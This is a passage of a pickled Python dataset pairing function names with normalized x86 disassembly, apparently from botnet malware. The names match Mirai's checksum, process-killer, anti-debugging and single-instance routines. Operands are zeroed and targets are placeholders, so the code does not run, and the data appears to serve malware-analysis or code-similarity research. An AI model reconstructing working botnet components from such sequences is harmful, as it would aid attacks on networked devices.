nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nMOV~[ESP+0],0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~EBX,EDX\nPUSH~EAX\nSUB~EBX,ESI\nPUSH~EBX\nLEA~EAX,[ESP+0]\nADD~EAX,ESI\nPUSH~EAX\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+EBX+0],0\nPOP~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nJMP~FOO"'
p62
L1467L
tp63
a(S'checksum_generic'
p64
S'"PUSH~EBX\nXOR~EBX,EBX\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nCMP~ECX,0\nJBE~FOO\nMOV~AX,[EDX]\nSUB~ECX,0\nAND~EAX,0\nADD~EDX,0\nADD~EBX,EAX\nCMP~ECX,0\nJA~FOO\nDEC~ECX\nJNZ~FOO\nMOVSX~EAX,BYTEPTR[EDX]\nADD~EBX,EAX\nMOV~EAX,EBX\nMOVZX~EDX,BX\nSHR~EAX,0\nPOP~EBX\nADD~EAX,EDX\nMOV~EDX,EAX\nSHR~EDX,0\nADD~EAX,EDX\nXOR~EAX,0\nAND~EAX,0\nRETN"'
p65
L72L
tp66
a(S'checksum_tcpudp'
p67
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~EBX,EBX\nMOV~ESI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],AX\nMOV~EDI,[ESI+0]\nMOV~EBP,[ESI+0]\nCMP~ECX,0\nJLE~FOO\nLEA~ESI,[ESI+0]\nMOV~AX,[EDX]\nSUB~ECX,0\nAND~EAX,0\nADD~EDX,0\nADD~EBX,EAX\nCMP~ECX,0\nJG~FOO\nDEC~ECX\nJZ~FOO\nMOV~ECX,EBP\nXOR~EAX,EAX\nSHR~ECX,0\nMOV~AL,[ESI+0]\nROR~AX,0\nLEA~ECX,[EBX+ECX]\nAND~EAX,0\nADD~ECX,EAX\nMOV~EDX,EDI\nMOV~EAX,EDI\nAND~EDX,0\nSHR~EAX,0\nADD~EAX,EDX\nMOV~EDX,EBP\nAND~EDX,0\nADD~EAX,EDX\nMOV~DX,[ESP+0]\nAND~EDX,0\nADD~EAX,EDX\nLEA~EAX,[ECX+EAX]\nMOV~EDX,EAX\nSHR~EDX,0\nJZ~FOO\nAND~EAX,0\nADD~EAX,EDX\nMOV~EDX,EAX\nSHR~EDX,0\nJNZ~FOO\nXOR~EAX,0\nPOP~EDX\nAND~EAX,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nXOR~EAX,EAX\nMOV~AL,[EDX]\nADD~EBX,EAX\nJMP~FOO"'
p68
L180L
tp69
a(S'killer_kill'
p70
S'"SUB~ESP,0\nMOV~EAX,<STR>\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nRETN"'
p71
L20L
tp72
a(S'killer_kill_by_port'
p73
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nLEA~EDI,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nPUSH~ESI\nPUSH~0\nPUSH~0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nROR~BX,0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nAND~EBX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nPOP~ECX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nXOR~EBX,EBX\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nCMP~EAX,0\nJZ~FOO\nPUSH~EAX\nPUSH~EBP\nPUSH~0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~AL,[ESP+0]\nTEST~AL,AL\nJZ~FOO\nXOR~EDX,EDX\nCMP~AL,0\nJZ~FOO\nINC~EDX\nMOV~AL,[EDX+EDI]\nTEST~AL,AL\nJZ~FOO\nCMP~AL,0\nJNZ~FOO\nTEST~AL,AL\nJZ~FOO\nLEA~ECX,[EDX+0]\nMOV~AL,[ESP+ECX+0]\nTEST~AL,AL\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nLEA~EAX,[EDI+EDX]\nMOV~DL,[EAX+0]\nINC~EAX\nTEST~DL,DL\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nSUB~EAX,EDI\nLEA~ESI,[EAX+0]\nMOV~[ESP+ESI+0],0\nSUB~ESP,0\nLEA~EBX,[EDI+ECX]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nLEA~ECX,[ESI+0]\nLEA~EDX,[EDI+ESI]\nXOR~EBX,EBX\nXOR~ESI,ESI\nMOV~[ESP+0],0\nMOV~AL,[EDX+0]\nINC~ECX\nTEST~AL,AL\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nDEC~BL\nJZ~FOO\nXOR~EBX,EBX\nINC~EDX\nCMP~ESI,0\nJLE~FOO\nMOV~EDX,ECX\nCMP~[ESP+0],0\nJZ~FOO\nMOV~AL,[ESP+ECX+0]\nTEST~AL,AL\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nLEA~EAX,[EDI+ECX]\nMOV~BL,[EAX+0]\nINC~ECX\nINC~EAX\nTEST~BL,BL\nJZ~FOO\nCMP~BL,0\nJNZ~FOO\nMOV~[ESP+ECX+0],0\nSUB~ESP,0\nLEA~EBX,[EDI+EDX]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nPOP~EAX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nXOR~EBX,EBX\nMOV~[ESP],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nTEST~EAX,EAX\nMOV~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJNZ~FOO\nLEA~EDI,[EAX+0]\nMOV~AL,[EAX+0]\nSUB~EAX,0\nCMP~AL,0\nJA~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~ESI\nPOP~EBP\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EDI\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EBP\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~ESI\nMOV~EBX,EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EBX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~ESI\nPOP~EBP\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EDI\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EBP\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~ESI\nMOV~EBX,EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EBX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nMOV~ESI,EAX\nTEST~EAX,EAX\nJZ~FOO\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nPOP~EBX\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EAX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~EDI\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nPOP~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EBX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EDX\nLEA~EDX,[ESI+0]\nPOP~ECX\nPUSH~EDX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EBX\nPUSH~EBX\nPUSH~0\nPUSH~EDI\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nJMP~FOO\nINC~ESI\nCMP~ESI,0\nJNZ~FOO\nCMP~[EDX+0],0\nJZ~FOO\nINC~EDX\nXOR~EBX,EBX\nJMP~FOO\nMOV~BL,0\nJMP~FOO\nXOR~EDX,EDX\nJMP~FOO\nMOV~ESI,ECX\nJMP~FOO\nSUB~ESP,0\nXOR~EBX,EBX\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nMOV~[ESP+0],0\nJMP~FOO\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nMOVSX~EBX,[ESP+0]\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nMOV~AL,[ESP+0]\nMOV~[ESP+0],0\nMOV~[ESP+0],AL\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nJMP~FOO\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nJMP~FOO"'
p74
L1567L
tp75
a(S'killer_init'
p76
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EDI,EAX\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,EAX\nTEST~EAX,EAX\nJLE~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nLEA~EAX,[ESP+0]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nPOP~ESI\nPOP~EBP\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nLEA~EAX,[ESP+0]\nPUSH~ECX\nPUSH~0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~<STR>,EAX\nMOV~BYTEPTR[EAX],0\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EBP\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EBX\nPOP~ESI\nPUSH~EAX\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nPUSH~EAX\nCALL~FOO\nLEA~EBX,[ESP+0]\nADD~EBX,EAX\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nPOP~EBP\nADD~EBX,EAX\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~ECX\nPOP~ESI\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nMOV~ESI,EAX\nPOP~EAX\nPOP~EDX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nMOV~EAX,<STR>\nPUSH~0\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nMOV~EAX,<STR>\nMOV~BYTEPTR[EAX+EDX],0\nPUSH~EBP\nPUSH~EBP\nMOV~ECX,[ESP+0]\nLEA~EAX,[EBX+ESI]\nSUB~EAX,ECX\nMOV~EBX,EDI\nPUSH~EAX\nMOV~ESI,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nLEA~ESI,[ESI+0]\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nLEA~ESI,[ESI+0]\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nTEST~EAX,EAX\nJZ~FOO\nMOV~AL,[EDX+0]\nSUB~EAX,0\nCMP~AL,0\nJA~FOO\nSUB~ESP,0\nLEA~EDI,[EDX+0]\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nMOV~EAX,[ESP+0]\nINC~EAX\nCMP~ESI,EBP\nMOV~[ESP+0],EAX\nJL~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nSUB~EAX,EBX\nADD~ESP,0\nCMP~EAX,0\nJLE~FOO\nMOV~ESI,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~ESI\nPOP~EDX\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nLEA~ESI,[ESP+0]\nPOP~ECX\nADD~ESI,EAX\nPOP~EBX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~EBX,EAX\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EAX\nLEA~EAX,[ESI+EBX]\nPUSH~EAX\nCALL~FOO\nPOP~ESI\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nLEA~ESI,[ESP+0]\nADD~ESI,EAX\nPOP~EAX\nPOP~EDX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nPOP~ECX\nPOP~EDI\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EDI\nPOP~EDX\nPUSH~EAX\nLEA~EAX,[ESI+EBX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EDI,[ESP+0]\nPUSH~EDI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+EAX+0],0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~ECX\nPOP~ESI\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~EAX,[EBX-0]\nPUSH~EAX\nLEA~EDI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nCALL~FOO\nADD~ESP,0\nCMP~EBP,EAX\nJZ~FOO\nCALL~FOO\nCMP~EBP,EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~EAX\nLEA~EDI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJZ~FOO\nMOV~ESI,EBP\nMOV~EBX,[ESP+0]\nJMP~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~EBP,0\nJLE~FOO\nMOV~EAX,0\nMUL~,[ESP+0]\nMOV~EAX,EDX\nSHR~EAX,0\nLEA~EAX,[EAX+EAX*4]\nADD~EAX,EAX\nCMP~[ESP+0],EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJNZ~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~ESI\nPUSH~ESI\nPUSH~0\nLEA~EDI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~ECX\nPOP~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nPOP~EAX\nPOP~EDX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nPOP~ESI\nPOP~EDI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nPOP~ECX\nPOP~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nPOP~EAX\nPOP~EDX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESP],EAX\nCMP~EBX,EAX\nJL~FOO\nMOV~EDX,EBX\nXOR~ESI,ESI\nDEC~EDX\nLEA~ECX,[ESP+0]\nCMP~EDX,0\nJZ~FOO\nLEA~ESI,[ESI+0]\nMOV~EDI,[ESP+0]\nMOV~AL,[ECX]\nCMP~AL,[EDI+ESI]\nJZ~FOO\nXOR~ESI,ESI\nDEC~EDX\nINC~ECX\nCMP~EDX,0\nJNZ~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESP],EAX\nCMP~EBX,EAX\nJL~FOO\nMOV~EDX,EBX\nXOR~ESI,ESI\nDEC~EDX\nLEA~ECX,[ESP+0]\nCMP~EDX,0\nJZ~FOO\nMOV~EDI,[ESP+0]\nMOV~AL,[ECX]\nCMP~AL,[EDI+ESI]\nJZ~FOO\nXOR~ESI,ESI\nINC~ECX\nDEC~EDX\nCMP~EDX,0\nJNZ~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESP],EAX\nCMP~EBX,EAX\nJL~FOO\nMOV~EDX,EBX\nXOR~ESI,ESI\nDEC~EDX\nLEA~ECX,[ESP+0]\nCMP~EDX,0\nJZ~FOO\nMOV~EDI,[ESP+0]\nMOV~AL,[ECX]\nCMP~AL,[EDI+ESI]\nJZ~FOO\nXOR~ESI,ESI\nINC~ECX\nDEC~EDX\nCMP~EDX,0\nJNZ~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESP],EAX\nCMP~EBX,EAX\nJL~FOO\nMOV~EDX,EBX\nXOR~ESI,ESI\nDEC~EDX\nLEA~ECX,[ESP+0]\nCMP~EDX,0\nJZ~FOO\nLEA~ESI,[ESI+0]\nMOV~EDI,[ESP+0]\nMOV~AL,[ECX]\nCMP~AL,[EDI+ESI]\nJZ~FOO\nXOR~ESI,ESI\nINC~ECX\nDEC~EDX\nCMP~EDX,0\nJNZ~FOO\nMOV~ESI,[ESP+0]\nCMP~EBX,ESI\nJL~FOO\nLEA~EDX,[ESP+0]\nXOR~ECX,ECX\nLEA~ESI,[ESI+0]\nDEC~EBX\nCMP~EBX,0\nJZ~FOO\nMOV~EDI,[ESP+0]\nMOV~AL,[EDX]\nCMP~AL,[EDI+ECX]\nJZ~FOO\nXOR~ECX,ECX\nINC~EDX\nJMP~FOO\nINC~ESI\nCMP~[ESP],ESI\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nMOV~EDI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nPOP~EBX\nPOP~ESI\nPUSH~0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nMOV~ESI,EBP\nLEA~EDI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~EBX,[ESP+0]\nADD~ESP,0\nJMP~FOO\nINC~ESI\nCMP~[ESP],ESI\nJZ~FOO\nINC~ECX\nJMP~FOO\nINC~ESI\nCMP~[ESP],ESI\nJZ~FOO\nINC~ECX\nJMP~FOO\nINC~ESI\nCMP~[ESP],ESI\nJZ~FOO\nINC~ECX\nJMP~FOO\nINC~ECX\nCMP~ESI,ECX\nJZ~FOO\nINC~EDX\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nMOV~EDI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nJMP~FOO"'
p77
L2020L
tp78
a(S'anti_gdb_entry'
p79
S'"MOV~<STR>,0\nRETN"'
p80
L11L
tp81
a(S'ensure_single_instance'
p82
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~[ESP+0],0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nMOV~<STR>,EAX\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,<STR>\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,0\nCMP~<STR>,0\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],EAX\nMOV~[ESP+0],0\nCALL~FOO\nLEA~ESI,[ESP+0]\nMOV~EBX,EAX\nMOV~DWORDPTR[EAX],0\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~0\nPUSH~ESI\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~EAX,<STR>\nPUSH~EDX\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN\nMOV~EAX,<STR>\nJMP~FOO\nCMP~DWORDPTR[EBX],0\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nMOV~ESI,<STR>\nPUSH~ESI\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EBX\nMOV~ECX,<STR>\nPUSH~ECX\nCALL~FO